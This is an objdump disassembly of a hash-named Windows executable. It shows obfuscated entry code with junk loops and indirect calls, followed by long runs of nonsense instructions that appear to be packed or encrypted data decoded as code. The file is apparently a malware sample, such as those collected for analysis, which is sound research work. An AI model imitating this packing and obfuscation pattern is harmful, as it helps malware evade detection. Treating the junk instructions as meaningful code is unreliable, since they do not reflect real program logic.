
4ed832be6936a2760312533f766b8f10d7df3d8c82ce5b430f9d3ecf6f78894b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	mov    DWORD PTR ds:0x434329,0x7186
  401015:	mov    DWORD PTR [ebp-0x20],eax
  401018:	mov    ecx,DWORD PTR [ebp-0x20]
  40101b:	mov    DWORD PTR ds:0x43429e,0x6cee
  401025:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40102c:	mov    DWORD PTR ds:0x4325f0,0x6120
  401036:	cmp    ecx,eax
  401038:	mov    DWORD PTR ds:0x43431d,0x7018
  401042:	jne    0x4019f7
  401048:	mov    ax,WORD PTR [ebp-0x24]
  40104c:	push   esi
  40104d:	mov    DWORD PTR ds:0x4325fc,0x1b
  401057:	cmp    DWORD PTR ds:0x4325fc,0x0
  40105e:	je     0x40108e
  401064:	cmp    DWORD PTR ds:0x4325fc,0x22
  40106b:	jne    0x40107c
  401071:	push   0x432cc2
  401076:	call   DWORD PTR ds:0x4328b2
  40107c:	mov    ecx,DWORD PTR ds:0x4325fc
  401082:	dec    ecx
  401083:	mov    DWORD PTR ds:0x4325fc,ecx
  401089:	jmp    0x401057
  40108e:	mov    ecx,0x8a3e
  401093:	mov    DWORD PTR ds:0x43428a,0x48c
  40109d:	xor    ax,cx
  4010a0:	add    DWORD PTR ds:0x434319,0x61ba
  4010aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4010ad:	xor    esi,DWORD PTR ds:0x434296
  4010b3:	push   edi
  4010b4:	mov    DWORD PTR ds:0x43427a,0x1c
  4010be:	cmp    DWORD PTR ds:0x43427a,0x0
  4010c5:	je     0x401105
  4010cb:	cmp    DWORD PTR ds:0x43427a,0x25
  4010d2:	jne    0x4010f3
  4010d8:	push   0x38d9
  4010dd:	push   DWORD PTR [ebp-0xc]
  4010e0:	push   0x7b63
  4010e5:	push   0x618f
  4010ea:	push   DWORD PTR [ebp-0x28]
  4010ed:	call   DWORD PTR ds:0x4328b6
  4010f3:	mov    edi,DWORD PTR ds:0x43427a
  4010f9:	dec    edi
  4010fa:	mov    DWORD PTR ds:0x43427a,edi
  401100:	jmp    0x4010be
  401105:	mov    edi,0x3b04
  40110a:	xor    DWORD PTR ds:0x432600,edx
  401110:	add    ax,di
  401113:	add    DWORD PTR ds:0x43429a,0xf3f
  40111d:	movzx  eax,ax
  401120:	add    DWORD PTR ds:0x4325f4,edi
  401126:	not    eax
  401128:	or     esi,DWORD PTR ds:0x434311
  40112e:	and    eax,DWORD PTR [ecx]
  401130:	movzx  ecx,WORD PTR ds:0x432cc2
  401137:	xor    DWORD PTR ds:0x432ce6,ecx
  40113d:	mov    ecx,DWORD PTR [ebp+0x8]
  401140:	sub    DWORD PTR ds:0x434325,ecx
  401146:	mov    DWORD PTR [ecx],eax
  401148:	adc    ecx,0x6b0b
  40114e:	mov    ecx,0x7510855
  401153:	sbb    esi,DWORD PTR ds:0x432cda
  401159:	mov    esi,0x32729c
  40115e:	sbb    DWORD PTR ds:0x434325,0x3918
  401168:	push   ebx
  401169:	or     DWORD PTR ds:0x4342a2,ebx
  40116f:	mov    ax,WORD PTR [ebp-0x24]
  401173:	dec    ebx
  401174:	movzx  eax,ax
  401177:	mov    DWORD PTR [ebp-0x38],eax
  40117a:	sub    eax,0x1c8b
  40117f:	mov    eax,DWORD PTR [ebp+0x8]
  401182:	mov    DWORD PTR [ebp-0x28],eax
  401185:	xor    eax,eax
  401187:	or     eax,DWORD PTR ds:0x432cce
  40118d:	add    DWORD PTR ds:0x434276,eax
  401193:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  40119a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4011a1:	mov    eax,0x9577
  4011a6:	or     DWORD PTR ds:0x43429a,0x2325
  4011b0:	mov    WORD PTR [ebp-0x4],ax
  4011b4:	movzx  ebx,BYTE PTR ds:0x4325f4
  4011bb:	or     DWORD PTR ds:0x4325f0,ebx
  4011c1:	lea    eax,[ebp-0x30]
  4011c4:	mov    DWORD PTR [ebp-0x34],eax
  4011c7:	mov    eax,DWORD PTR [ebp-0x28]
  4011ca:	mov    DWORD PTR [ebp-0x2c],eax
  4011cd:	add    DWORD PTR ds:0x434319,0x693e
  4011d7:	lea    eax,[ebp-0x18]
  4011da:	and    DWORD PTR ds:0x43426a,0x0
  4011e4:	jmp    0x4011f6
  4011e9:	mov    ebx,DWORD PTR ds:0x43426a
  4011ef:	inc    ebx
  4011f0:	mov    DWORD PTR ds:0x43426a,ebx
  4011f6:	cmp    DWORD PTR ds:0x43426a,0x18
  4011fd:	jae    0x40123a
  401203:	cmp    DWORD PTR ds:0x43426a,0x8
  40120a:	jne    0x40121b
  401210:	push   0x7a50
  401215:	call   DWORD PTR ds:0x4328ba
  40121b:	cmp    DWORD PTR ds:0x43426a,0x7
  401222:	jne    0x401235
  401228:	mov    ebx,DWORD PTR ds:0x43426a
  40122e:	inc    ebx
  40122f:	mov    DWORD PTR ds:0x43426a,ebx
  401235:	jmp    0x4011e9
  40123a:	mov    DWORD PTR [ebp-0x1c],eax
  40123d:	mov    eax,DWORD PTR [ebp-0x1c]
  401240:	mov    DWORD PTR [eax],0xf89f2da9
  401246:	mov    eax,DWORD PTR [ebp-0x14]
  401249:	mov    ebx,DWORD PTR [ebp-0x8]
  40124c:	and    DWORD PTR ds:0x434315,0x66ce
  401256:	xor    eax,ecx
  401258:	xor    ebx,ecx
  40125a:	and    DWORD PTR ds:0x434319,0x3a0f
  401264:	xor    edx,edx
  401266:	and    DWORD PTR ds:0x432ce6,0x4325f0
  401270:	add    eax,esi
  401272:	mov    DWORD PTR ds:0x43431d,0x1b71
  40127c:	add    ebx,esi
  40127e:	div    ebx
  401280:	mov    DWORD PTR ds:0x434276,0x5747
  40128a:	mov    edx,DWORD PTR [ebp-0x2c]
  40128d:	mov    DWORD PTR ds:0x4325f4,0x57da
  401297:	cmp    eax,DWORD PTR [edx]
  401299:	mov    DWORD PTR ds:0x434282,0x6b31
  4012a3:	je     0x4019ca
  4012a9:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4012b0:	lea    eax,[ebp-0xc]
  4012b3:	sbb    edx,DWORD PTR ds:0x432cca
  4012b9:	mov    DWORD PTR [ebp-0x10],eax
  4012bc:	mov    eax,DWORD PTR [ebp-0x10]
  4012bf:	jmp    0x401447
  4012c4:	popa   
  4012c5:	xchg   BYTE PTR ds:0x6151e949,cl
  4012cb:	mov    dh,0x3f
  4012cd:	mov    ah,0xd5
  4012cf:	mov    dl,0x80
  4012d1:	pop    edi
  4012d2:	ss loopne 0x401345
  4012d5:	jo     0x401347
  4012d7:	jo     0x4012be
  4012d9:	jg     0x40134b
  4012db:	jo     0x40129d
  4012dd:	xlat   BYTE PTR ds:[ebx]
  4012de:	cmp    eax,0xcfd339d5
  4012e3:	rol    eax,1
  4012e5:	pop    es
  4012e6:	push   es
  4012e7:	add    ecx,DWORD PTR [esi]
  4012e9:	ret    
  4012ea:	add    cl,BYTE PTR [edi]
  4012ec:	xor    ecx,DWORD PTR [edi]
  4012ee:	ret    0xc71a
  4012f1:	adc    bl,BYTE PTR [edi]
  4012f3:	mov    ecx,0xddb7025a
  4012f8:	add    bh,ch
  4012fa:	mov    ebp,0x8003c8db
  4012ff:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401305:	lods   eax,DWORD PTR ds:[esi]
  401306:	sar    BYTE PTR [eax+0x6fee581f],1
  40130c:	or     edx,DWORD PTR [ecx]
  40130e:	sahf   
  40130f:	jp     0x4012d9
  401311:	inc    edx
  401312:	lods   al,BYTE PTR ds:[esi]
  401313:	push   ebx
  401314:	sub    eax,0xad3ec6d1
  401319:	mov    WORD PTR [ebx-0x3b],?
  40131c:	stos   DWORD PTR es:[edi],eax
  40131d:	js     0x4012e5
  40131f:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401325:	jmp    0x401359
  401327:	mov    ebp,ecx
  401329:	dec    edi
  40132a:	fcomp  DWORD PTR [eax-0x656800bf]
  401330:	pop    es
  401331:	test   eax,0xed4dbddc
  401336:	sub    BYTE PTR [ebp+0x23],dl
  401339:	mov    ah,0xec
  40133b:	pusha  
  40133c:	nop
  40133d:	mov    esi,0x94c3117b
  401342:	and    esi,edx
  401344:	jmp    0x401396
  401346:	(bad)  
  401347:	out    0xba,al
  401349:	repnz in al,dx
  40134b:	xchg   esp,eax
  40134c:	xor    edi,ecx
  40134e:	jbe    0x4013b5
  401350:	xlat   BYTE PTR ds:[ebx]
  401351:	and    cl,ch
  401353:	add    al,0xd9
  401355:	adc    DWORD PTR [ecx-0x68],edx
  401358:	xor    eax,0x7a616f03
  40135d:	or     dh,BYTE PTR [ecx]
  40135f:	fld    QWORD PTR [eax+0x7f752a56]
  401365:	xor    BYTE PTR [edi+0xba8db0c],cl
  40136b:	pop    ebx
  40136c:	push   ebp
  40136d:	(bad)  
  40136f:	or     ebx,edx
  401371:	pop    esi
  401372:	fstp   DWORD PTR [ecx]
  401374:	jno    0x401306
  401376:	mov    eax,0x2b15374b
  40137b:	ja     0x4013a6
  40137d:	sbb    al,0xd3
  40137f:	xor    BYTE PTR [edi-0x16],cl
  401382:	into   
  401383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401384:	pop    ds
  401385:	cwde   
  401386:	rcl    BYTE PTR [esi-0x20d3a9ef],0x76
  40138d:	jle    0x4013a6
  40138f:	div    DWORD PTR [ebx+0x19d32800]
  401395:	dec    esp
  401396:	daa    
  401397:	(bad)  
  401398:	and    al,0x14
  40139a:	xchg   DWORD PTR [edi+0x6f],edx
  40139d:	push   DWORD PTR [ebp-0x4a5d2f3]
  4013a3:	xor    edi,0xffffffcf
  4013a6:	push   esp
  4013a7:	mov    gs,ebp
  4013a9:	rcl    DWORD PTR [ecx-0x4],cl
  4013ac:	xor    eax,0xff8fe722
  4013b1:	fild   QWORD PTR [eax+0x61]
  4013b4:	scas   eax,DWORD PTR es:[edi]
  4013b5:	add    edx,esi
  4013b7:	sub    eax,0xb4305bd1
  4013bc:	xchg   BYTE PTR [edx+0x63d6aaf3],dh
  4013c2:	cmp    DWORD PTR [edx+0xac115aa],eax
  4013c8:	fwait
  4013c9:	bound  edx,QWORD PTR [edi-0x7d]
  4013cc:	dec    DWORD PTR [eax+0x51]
  4013cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013d0:	ss mov bl,0x8d
  4013d3:	loopne 0x40144d
  4013d5:	push   ss
  4013d6:	adc    eax,0xeefdcc7f
  4013db:	adc    DWORD PTR [edx],0xfcfa2934
  4013e1:	popf   
  4013e2:	push   0xa6fa972a
  4013e7:	cmovno ecx,DWORD PTR [ebp*2+0x6279a144]
  4013ef:	(bad)  
  4013f2:	icebp  
  4013f3:	repz jae 0x4013e1
  4013f6:	sub    dh,BYTE PTR [ebx]
  4013f8:	shl    bh,cl
  4013fa:	stos   BYTE PTR es:[edi],al
  4013fb:	into   
  4013fc:	test   eax,0x52dd896b
  401401:	sahf   
  401402:	int3   
  401403:	mov    bh,0x40
  401405:	jl     0x90d501f9
  40140b:	xchg   edi,eax
  40140c:	out    0xdf,al
  40140e:	sahf   
  40140f:	std    
  401410:	ret    0xd3cf
  401413:	jae    0x4013e9
  401415:	or     al,0x2d
  401417:	pop    ds
  401418:	adc    al,0xf9
  40141a:	adc    al,0xf7
  40141c:	pop    ebx
  40141d:	xchg   esp,eax
  40141e:	ja     0x401461
  401420:	mov    dl,0xd5
  401422:	xchg   esi,eax
  401423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401424:	sar    ch,0xb9
  401427:	pushf  
  401428:	push   esi
  401429:	dec    eax
  40142a:	push   ebx
  40142b:	push   esp
  40142c:	xor    BYTE PTR [ecx+0x1b],al
  40142f:	add    al,BYTE PTR [ecx]
  401431:	sbb    eax,0x73013025
  401436:	inc    ecx
  401437:	xchg   esp,eax
  401438:	sub    ecx,DWORD PTR ds:0x37aa8b97
  40143e:	popf   
  40143f:	ss push esp
  401441:	cmc    
  401442:	fwait
  401443:	stos   BYTE PTR es:[edi],al
  401444:	adc    al,0x53
  401446:	adc    BYTE PTR [ebx-0x132d96f0],cl
  40144c:	test   eax,0x1089f89e
  401451:	mov    eax,DWORD PTR [ebp-0xc]
  401454:	cmp    eax,0x742b26d4
  401459:	jmp    0x4015e1
  40145e:	push   ds
  40145f:	fcmovnb st,st(2)
  401461:	mov    edx,0x5ba661c1
  401466:	xlat   BYTE PTR ds:[ebx]
  401467:	les    ecx,FWORD PTR [esi]
  401469:	test   DWORD PTR [eax-0x1af26d18],esi
  40146f:	jg     0x4014e1
  401471:	jo     0x401458
  401473:	jg     0x4014e5
  401475:	jo     0x40148a
  401477:	jo     0x4014aa
  401479:	xor    ecx,DWORD PTR [edi-0x44]
  40147c:	push   eax
  40147d:	jmp    0x4014b5
  40147f:	xchg   ch,bl
  401481:	push   edx
  401482:	jae    0x401423
  401484:	cmc    
  401485:	fwait
  401486:	and    esi,DWORD PTR [ebx+0x17c809db]
  40148c:	inc    esp
  40148d:	xor    DWORD PTR [edx+0xc4dec17],0xfffffffa
  401494:	adc    eax,0x38dca546
  401499:	sbb    DWORD PTR [ebp+0x15],0x9f25114f
  4014a0:	(bad)  
  4014a1:	cli    
  4014a2:	hlt    
  4014a3:	xchg   BYTE PTR cs:[eax],ch
  4014a6:	cmp    ah,dh
  4014a8:	js     0x401430
  4014aa:	mov    edi,DWORD PTR [bp+di+0x1480]
  4014af:	sbb    BYTE PTR [edx+0x715b37b2],0x9e
  4014b6:	dec    edi
  4014b7:	ds push ebx
  4014b9:	(bad)  
  4014ba:	hlt    
  4014bb:	repz shr DWORD PTR [edi-0x34d1105a],0x9c
  4014c3:	adc    eax,0x9b74d13
  4014c8:	bound  eax,QWORD PTR [edx+eax*2]
  4014cb:	sar    BYTE PTR fs:[eax-0x4e81bc33],cl
  4014d2:	retf   0x35e3
  4014d5:	div    BYTE PTR ds:0xbdfb68f9
  4014db:	xchg   edi,eax
  4014dc:	shr    BYTE PTR [edi],1
  4014de:	dec    ebx
  4014df:	mov    dl,0x23
  4014e1:	dec    ebx
  4014e2:	mov    edx,0xa302c46e
  4014e7:	(bad)  
  4014e8:	dec    ecx
  4014e9:	adc    DWORD PTR [esi],edx
  4014eb:	retf   
  4014ec:	stc    
  4014ed:	out    dx,al
  4014ee:	scas   eax,DWORD PTR es:[edi]
  4014ef:	je     0x401508
  4014f1:	mov    cl,0x2
  4014f3:	inc    esi
  4014f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014f5:	mov    dl,0x71
  4014f7:	push   0x6f
  4014f9:	dec    ebp
  4014fa:	ins    BYTE PTR es:[edi],dx
  4014fb:	or     bh,BYTE PTR [esi]
  4014fd:	cmp    eax,0xfcd833f9
  401502:	lea    ecx,[eax]
  401504:	fs nop
  401506:	fs loope 0x401561
  401509:	and    al,BYTE PTR [ebp-0x10247bda]
  40150f:	and    ebx,eax
  401511:	and    al,0x97
  401513:	jp     0x401524
  401515:	mov    ds:0xcca2d13f,eax
  40151a:	pop    edi
  40151b:	fdivr  DWORD PTR [eax-0x16d693f3]
  401521:	mov    ch,0x49
  401523:	or     dh,dl
  401525:	mov    bh,BYTE PTR ds:0x31b76df3
  40152b:	inc    edx
  40152c:	inc    edi
  40152d:	sub    BYTE PTR [edx],al
  40152f:	leave  
  401530:	jl     0x4015a2
  401532:	sub    ch,ch
  401534:	push   0xaa07af37
  401539:	jmp    eax
  40153b:	fisttp WORD PTR [ebp-0x30a81a02]
  401541:	mov    esp,0x3b00707d
  401546:	jmp    0x303536e9
  40154b:	xchg   esi,eax
  40154c:	mov    dh,0x80
  40154e:	cmp    BYTE PTR [edx+0x1],0x89
  401552:	or     eax,0x5768aa7a
  401557:	test   eax,0x53f29111
  40155c:	ins    DWORD PTR es:[edi],dx
  40155d:	push   eax
  40155e:	dec    ebp
  40155f:	das    
  401560:	ins    BYTE PTR es:[edi],dx
  401561:	inc    ebx
  401562:	mov    ?,WORD PTR [ecx]
  401564:	add    eax,0x217cf551
  401569:	das    
  40156a:	fld    QWORD PTR [ecx]
  40156c:	sub    ah,BYTE PTR ds:0x8a3ae418
  401572:	xor    ebp,0x73
  401575:	sbb    ebx,DWORD PTR [eax]
  401577:	adc    DWORD PTR [ebx+edi*8-0x4a],eax
  40157b:	mov    al,0x48
  40157d:	test   DWORD PTR ds:0x8f3c8557,0xd4db27ec
  401587:	xchg   edi,eax
  401588:	mov    bl,0x4f
  40158a:	pop    ebx
  40158b:	mov    bh,BYTE PTR [esi+0x4fbbab18]
  401591:	repz mov al,ds:0xe4ad0e40
  401597:	push   ebp
  401598:	mov    WORD PTR [ebp+0x2e48d5c4],?
  40159e:	in     eax,0xa0
  4015a0:	push   ecx
  4015a1:	in     al,0xf0
  4015a3:	sti    
  4015a4:	dec    edi
  4015a5:	push   ds
  4015a6:	ins    BYTE PTR es:[edi],dx
  4015a7:	inc    eax
  4015a8:	shr    edi,cl
  4015aa:	push   0x3974236a
  4015af:	and    bl,BYTE PTR [ecx+ebx*2-0x59]
  4015b3:	(bad)  
  4015b4:	lds    ebx,FWORD PTR [eax+eiz*1+0x73]
  4015b8:	sbb    ch,BYTE PTR [eax+0x57]
  4015bb:	inc    ecx
  4015bc:	xchg   esi,eax
  4015bd:	arpl   WORD PTR [ecx],cx
  4015bf:	call   DWORD PTR [esi]
  4015c1:	out    dx,eax
  4015c2:	(bad)  
  4015c3:	loope  0x40156c
  4015c5:	sub    ebx,DWORD PTR [edi+0x5b487cfb]
  4015cb:	jo     0x401556
  4015cd:	mov    ah,0x4c
  4015cf:	dec    edx
  4015d0:	test   ah,0x7d
  4015d3:	into   
  4015d4:	jp     0x40156f
  4015d6:	add    DWORD PTR [edi-0x4f7b4935],0x36
  4015dd:	retf   
  4015de:	mov    BYTE PTR [eax+0xe840f65],ch
  4015e4:	add    BYTE PTR [eax],al
  4015e6:	add    BYTE PTR [ebx+0x881e445],cl
  4015ec:	pushf  
  4015ed:	sbb    al,0x75
  4015ef:	pusha  
  4015f0:	jmp    0x4019d9
  4015f5:	mov    eax,DWORD PTR [ebp-0xc]
  4015f8:	add    eax,DWORD PTR [ebp-0x18]
  4015fb:	cmp    eax,0x6cca547d
  401600:	je     0x401614
  401606:	mov    eax,DWORD PTR [ebp-0x10]
  401609:	and    DWORD PTR [eax],0x751c99
  40160f:	jmp    0x4019d9
  401614:	mov    eax,DWORD PTR [ebp-0xc]
  401617:	mov    edx,DWORD PTR [ebp-0x18]
  40161a:	or     eax,edx
  40161c:	cmp    eax,0xfcbf2ffd
  401621:	je     0x401635
  401627:	mov    eax,DWORD PTR [ebp-0x10]
  40162a:	xor    DWORD PTR [eax],0x2650fa8f
  401630:	jmp    0x4019d9
  401635:	mov    ax,WORD PTR [ebp-0x4]
  401639:	mov    edx,0x8a3e
  40163e:	xor    ax,dx
  401641:	mov    edx,DWORD PTR [ebp-0x28]
  401644:	mov    edx,DWORD PTR [edx]
  401646:	add    ax,di
  401649:	cmp    ax,WORD PTR [edx]
  40164c:	je     0x401821
  401652:	mov    eax,DWORD PTR [ebp-0x14]
  401655:	xor    eax,ecx
  401657:	add    eax,esi
  401659:	mov    DWORD PTR [ebp-0x30],eax
  40165c:	mov    eax,DWORD PTR [ebp-0x34]
  40165f:	mov    dx,WORD PTR [ebp-0x38]
  401663:	mov    ebx,0x8a3e
  401668:	xor    dx,bx
  40166b:	mov    ebx,DWORD PTR [ebp-0x8]
  40166e:	add    dx,di
  401671:	jmp    0x4017f9
  401676:	clc    
  401677:	repnz sbb eax,0xa851698d
  40167d:	icebp  
  40167e:	pusha  
  40167f:	xchg   ebx,eax
  401680:	rcl    DWORD PTR [ebx+0x14],1
  401683:	mov    cl,0x61
  401685:	and    eax,0x70707e4a
  40168a:	in     eax,0x7f
  40168c:	jo     0x4016fe
  40168e:	mov    ebp,0x436a2dd0
  401693:	mov    BYTE PTR [ecx],ch
  401695:	jmp    0x335d:0x5f427902
  40169c:	add    ch,BYTE PTR [esi]
  40169e:	and    ch,BYTE PTR [ecx-0x4d]
  4016a1:	push   ss
  4016a2:	icebp  
  4016a3:	jp     0x4016e1
  4016a5:	dec    DWORD PTR ds:0x4de04d97
  4016ab:	add    esp,DWORD PTR [edi+0x19]
  4016ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016af:	cmc    
  4016b0:	xchg   ebp,eax
  4016b1:	inc    edi
  4016b2:	mov    al,ds:0x91a2f6b1
  4016b7:	test   DWORD PTR [edx-0x706e69f7],ebx
  4016bd:	in     al,0x77
  4016bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016c0:	push   edx
  4016c1:	mov    ebp,0x84726f1b
  4016c6:	out    0x2d,eax
  4016c8:	mov    ch,0xd5
  4016ca:	gs push ecx
  4016cc:	cs pushf 
  4016ce:	aas    
  4016cf:	cmove  eax,DWORD PTR [eax-0x68b4250c]
  4016d6:	and    DWORD PTR [ebx+0x22],edi
  4016d9:	nop
  4016da:	int    0xad
  4016dc:	retf   
  4016dd:	pop    ecx
  4016de:	add    DWORD PTR [edi+esi*8+0x2],ebp
  4016e2:	retf   
  4016e3:	repz in al,dx
  4016e5:	and    edx,esi
  4016e7:	shl    DWORD PTR [esi-0x44a2199b],cl
  4016ed:	adc    dl,ah
  4016ef:	pop    ebp
  4016f0:	pop    ecx
  4016f1:	pushf  
  4016f2:	retf   0xc18c
  4016f5:	or     eax,0xd0d765c6
  4016fa:	mov    al,0x55
  4016fc:	lods   al,BYTE PTR ds:[esi]
  4016fd:	aas    
  4016fe:	mov    bh,0x0
  401700:	push   ebx
  401701:	mov    dh,0x7b
  401703:	jnp    0x401728
  401705:	outs   dx,DWORD PTR ds:[esi]
  401706:	in     eax,dx
  401707:	push   esp
  401708:	xchg   esp,eax
  401709:	cmp    BYTE PTR [eax+0x13],0x67
  40170d:	add    BYTE PTR [eax-0x2cf85209],dh
  401713:	fucom  st(5)
  401715:	xchg   esp,esp
  401717:	in     al,0xcb
  401719:	xchg   BYTE PTR [edi-0x27],dl
  40171c:	jbe    0x4016b1
  40171e:	call   0xcdb2:0x40f3066f
  401725:	mov    DWORD PTR [edx-0x7737c20f],ebp
  40172b:	aam    0xea
  40172d:	test   eax,0x2e2b9513
  401732:	arpl   WORD PTR [edx],ax
  401734:	popf   
  401735:	outs   dx,BYTE PTR ds:[esi]
  401736:	scas   al,BYTE PTR es:[edi]
  401737:	xor    ecx,DWORD PTR [esi-0x311fe368]
  40173d:	xchg   esi,eax
  40173e:	adc    DWORD PTR [ecx+0x15],0x64f95920
  401745:	fadd   QWORD PTR [esi]
  401747:	pop    ebx
  401748:	jb     0x4016d8
  40174a:	sub    ecx,ebp
  40174c:	push   edi
  40174d:	sahf   
  40174e:	sbb    ch,BYTE PTR [edi-0x137e35]
  401754:	jae    0x4016dd
  401756:	pop    es
  401757:	push   0x4114d0c5
  40175c:	xchg   ecx,eax
  40175d:	jo     0x401796
  40175f:	xchg   ebp,eax
  401760:	call   0xc630d45b
  401765:	std    
  401766:	scas   eax,DWORD PTR es:[edi]
  401767:	mov    DWORD PTR [ecx+0x7733d39d],ebx
  40176d:	mov    eax,ds:0x694e2cb7
  401772:	sub    al,0x5a
  401774:	in     al,0x4b
  401776:	xchg   BYTE PTR [edx+0x57923d44],bl
  40177c:	lods   eax,DWORD PTR ds:[esi]
  40177d:	sub    eax,0xb3b63cf0
  401782:	lahf   
  401783:	fidiv  WORD PTR [edi+0x35]
  401786:	inc    eax
  401787:	add    DWORD PTR [ecx],eax
  401789:	dec    eax
  40178a:	hlt    
  40178b:	xor    edx,ecx
  40178d:	jmp    0x704e:0x45001086
  401794:	call   0x9397:0xd461b0ad
  40179b:	and    eax,DWORD PTR [ecx+ecx*1+0x3e]
  40179f:	sahf   
  4017a0:	cmp    eax,0x62445b8c
  4017a5:	mov    cs,ecx
  4017a7:	out    dx,eax
  4017a8:	cmp    al,0x69
  4017aa:	popa   
  4017ab:	or     DWORD PTR [ecx+edx*2],0xd631cfa7
  4017b2:	icebp  
  4017b3:	jmp    0x401799
  4017b5:	mov    al,0x18
  4017b7:	mov    ecx,0x94406dde
  4017bc:	jmp    0xe629caf8
  4017c1:	outs   dx,BYTE PTR ds:[esi]
  4017c2:	imul   BYTE PTR [esi+0x34]
  4017c5:	inc    ecx
  4017c6:	ins    BYTE PTR es:[edi],dx
  4017c7:	jne    0x401847
  4017c9:	xor    esp,0x62
  4017cc:	and    edi,ebx
  4017ce:	mov    gs,WORD PTR [edx-0x75]
  4017d1:	pop    es
  4017d2:	pop    esi
  4017d3:	mov    dh,0xf3
  4017d5:	aam    0x91
  4017d7:	cmp    ecx,DWORD PTR [ebx-0x77]
  4017da:	(bad)  
  4017db:	cmp    BYTE PTR [esp+ecx*2-0x444d5d80],cl
  4017e2:	stos   DWORD PTR es:[edi],eax
  4017e3:	vaddps ymm0,ymm6,ymm3
  4017e7:	jg     0x401817
  4017e9:	sar    BYTE PTR [eax+0x7],1
  4017ec:	push   ecx
  4017ed:	jmp    0x40179a
  4017ef:	sbb    ebp,ebx
  4017f1:	ficomp WORD PTR [esi-0x6bd95b4c]
  4017f7:	fs inc ecx
  4017f9:	movzx  edx,dx
  4017fc:	xor    ebx,ecx
  4017fe:	lea    edx,[edx+ebx*1+0x32729c]
  401805:	add    DWORD PTR [eax],edx
  401807:	mov    eax,DWORD PTR [ebp-0x2c]
  40180a:	mov    edx,DWORD PTR [ebp-0x8]
  40180d:	mov    ebx,DWORD PTR [ebp-0x30]
  401810:	xor    edx,ecx
  401812:	add    edx,esi
  401814:	imul   edx,ebx
  401817:	sub    DWORD PTR [eax],edx
  401819:	mov    eax,DWORD PTR [ebp-0x14]
  40181c:	jmp    0x4019dc
  401821:	mov    eax,DWORD PTR [ebp-0xc]
  401824:	mov    edx,DWORD PTR [ebp-0x18]
  401827:	jmp    0x4019af
  40182c:	pop    ebx
  40182d:	arpl   di,di
  40182f:	out    dx,eax
  401830:	xchg   ebx,esi
  401832:	imul   esi,DWORD PTR [ebx-0x5d],0x7d
  401836:	jae    0x401839
  401838:	xor    al,0xd3
  40183a:	cmp    eax,0x707c3fbc
  40183f:	jo     0x401826
  401841:	jg     0x4018b3
  401843:	jo     0x40184d
  401845:	cmp    esi,DWORD PTR [esp+esi*2]
  401848:	pusha  
  401849:	icebp  
  40184a:	sub    DWORD PTR [eax+0x54eb150c],ebx
  401850:	xchg   ebx,eax
  401851:	pop    ds
  401852:	lods   eax,DWORD PTR ds:[esi]
  401853:	pop    ebx
  401854:	aad    0xb0
  401856:	jge    0x401898
  401858:	cmp    ah,BYTE PTR [ebp+0x33]
  40185b:	xor    DWORD PTR [esi-0xd],esi
  40185e:	dec    esi
  40185f:	(bad)  
  401860:	std    
  401861:	jnp    0x4018e0
  401863:	outs   dx,DWORD PTR ds:[esi]
  401864:	or     BYTE PTR [esi+0x447549fb],bl
  40186a:	push   esp
  40186b:	fwait
  40186c:	mov    edi,0xe56432fd
  401871:	and    eax,0x81136b1a
  401876:	sub    ebp,eax
  401878:	rcl    DWORD PTR [ebp+0x27],0x54
  40187c:	dec    eax
  40187d:	xchg   ebx,eax
  40187e:	sub    al,0x74
  401880:	imul   eax,DWORD PTR [ebx+0x4b],0x39
  401884:	call   0xd721730f
  401889:	pop    edi
  40188a:	scas   al,BYTE PTR es:[edi]
  40188b:	pop    esi
  40188c:	sahf   
  40188d:	mov    al,0xba
  40188f:	dec    ebx
  401890:	jnp    0x401860
  401892:	ss retf 0x8975
  401896:	(bad)  
  401897:	adc    eax,0xd30facc5
  40189c:	and    eax,0x60dce754
  4018a1:	cmp    al,0x17
  4018a3:	adc    DWORD PTR [esi+esi*1-0x3d992a7e],edi
  4018aa:	enter  0xcedc,0x15
  4018ae:	xor    eax,0x80ce87dc
  4018b3:	adc    DWORD PTR [edx+0x17],eax
  4018b6:	shl    DWORD PTR [ebx-0x239db61c],cl
  4018bc:	rol    BYTE PTR [ebp+0x61],1
  4018bf:	clc    
  4018c0:	lds    edi,FWORD PTR [bp-0x1]
  4018c4:	cmp    bl,dl
  4018c6:	out    dx,eax
  4018c7:	ror    BYTE PTR [edi+0x17],cl
  4018ca:	dec    ebp
  4018cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018cc:	jb     0x401878
  4018ce:	scas   al,BYTE PTR es:[edi]
  4018cf:	test   al,0x56
  4018d1:	inc    edi
  4018d2:	jne    0x40191e
  4018d4:	mov    eax,eax
  4018d6:	jmp    0x46e2:0xaa3c2de8
  4018dd:	pop    ebx
  4018de:	ja     0x401936
  4018e0:	xor    al,cl
  4018e2:	cli    
  4018e3:	jmp    0x40191e
  4018e5:	add    ebx,eax
  4018e7:	jbe    0x401914
  4018e9:	pusha  
  4018ea:	xchg   ebx,edx
  4018ec:	and    ecx,DWORD PTR [ebx+0x18]
  4018ef:	jbe    0x401944
  4018f1:	xchg   edx,eax
  4018f2:	mov    bh,0x29
  4018f4:	dec    eax
  4018f5:	add    esp,ebp
  4018f7:	jnp    0x401967
  4018f9:	repnz pop ebx
  4018fb:	in     al,dx
  4018fc:	push   ds
  4018fd:	test   eax,edi
  4018ff:	or     eax,0xfd312bec
  401904:	lods   eax,DWORD PTR ds:[esi]
  401905:	pop    esp
  401906:	add    al,0xec
  401908:	cli    
  401909:	mov    esi,DWORD PTR [edi*4-0x37086423]
  401910:	and    cl,BYTE PTR [edx+0x54]
  401913:	cmp    ebx,DWORD PTR [edx+eax*8]
  401916:	mov    eax,0x873cab86
